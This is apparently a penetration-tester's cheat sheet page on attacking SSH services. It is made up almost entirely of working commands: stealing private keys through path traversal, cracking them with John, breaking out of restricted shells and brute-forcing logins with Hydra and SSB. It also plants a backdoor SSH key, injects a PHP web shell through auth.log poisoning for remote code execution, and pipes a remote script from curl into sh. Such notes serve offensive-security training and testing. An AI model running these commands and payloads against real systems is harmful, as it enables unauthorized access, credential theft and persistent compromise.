---
layout: default
title: SSH
parent: TCP
nav_order: 4-2
---
# SSH | 22
## Methodology
- Do you have alid credentials?
- Do you have real system-level users in which to access SSH with?
- ALWAYS check for user password re-use
- Dealing with id_rsa files - ALWAYS chmod 600 id_rsa
- Collect user SSH keys if able to read: "id_rsa" e.g. somefile.php?file=../../../../home/user/.ssh/id_rsa
- If able to write, drop a SSH key into the user or root directory for login (/root/.ssh/id_rsa)
- Are you able to read the SSH logs (SSH Log Poisoning): /var/log/auth.log

#### Restrictive Shell
If you have access to the <i>echo</i> command it is possible to use the built-in API to break out:
``` echo os.system("/bin/bash")```
Break out of <b> RBash </b>:
``` ssh restricted@$IP -p 31678 -t "bash --noprofile"
OR
ssh user@$IP "/bin/sh"
```

#### Check the following locations for private keys:
<ul>
<li>/home/* </li>
<li>/root/.ssh/* </li>
<li>/etc/ssh/ssh_config</li>
<li> /etc/ssh/sshd/ssh_config</li>
<li> ~/.ssh/*</li>
</ul>

#### Identify the host for the private key:
Check the following locations:
<ul>
<li> /etc/hosts </li>
<li> ~/.known_hosts </li>
<li> ~/.bash_history </li>
<li> ~/.ssh/config </li>
</ul>

#### Command Reference
<b> Search for files containing SSH Keys:</b>
```
grep -ir "-----BEGIN RSA PRIVATE KEY-----" /home/*
grep -ir "BEGIN DSA PRIVATE KEY" /*
```
<b> SSH with id_rsa </b>
``` ssh -i id_rsa user@$IP ```
<b> Crack id_rsa with John (SSH2John) </b>
``` ssh2john id_rsa > crackthis
john crackthis --wordlist=/usr/share/wordlists/rockyou.txt
```
<b> SSH Keygen & Back Door (post exploitation) </b>
Generate a new SSH key pair with:
```
ssh-keygen -b 2048 -t rsa -f ~/.ssh/new-key-name
chmod 600 new-key-name
```
Drop the 'new-key-name.pub' file into the target /home/usr/.ssh directory.
Connect with:
```
ssh -i new-key-name user@$IP
```

### Tools
- <a href="https://github.com/pwnesia/ssb"> Secure Shell Bruteforcer (SSB) </a>
```curl -sSfL 'https://git.io/kitabisa-ssb' | sh -s -- -b /usr/local/bin ```
```
ssb [-p port] [-w wordlist.txt] [-t timeout]
      [-c concurrent] [-r retries] [-o output] [user@]hostname
```

#### SSH Log Poisoning
RCE via SSH Log Poisoning:
Example PHP web server (capable of viewing the logs):
- Enter something like: ```testlogpoisoning/<?php passthru($_GET['cmd']); ?>``` 
- Refresh the accessible log page - find the newest entry (towards the bottom) and you may see the characters 'testlogpoisoning/'
> this verifies command execution after the format '/' providing executive authority over the machine
``` https://example.com/somefile.php?file=../../../../var/log/auth.log&cmd=id ```
> reopen the file, scroll down and find the results of the command printed


#### SSH Brute Force
- Hydra
``` hydra -V -L UserList -P PasswordList ssh://$IP ```
- SSB

#### SSH 'should' be running?
- Is there a HTTP proxy on the server? SSH may be running but not open to the world - instead of on 0.0.0.0, it may be local on 127.0.0.1
- If this is the case, it is possible to forward out the loopback address with <b> proxytunnel </b>
``` proxytunnel -p $IP:3128 -d 127.0.0.1:22 -a 4444 ```
> Spawn a daemon on our attacking machine (accessible on 4444)
``` ssh user@127.0.0.1 -p 4444 ```

###### [REFERENCES]
<a href="https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#what-is-a-lateral-movement"> SSH Lateral Movement Cheatsheet </a>
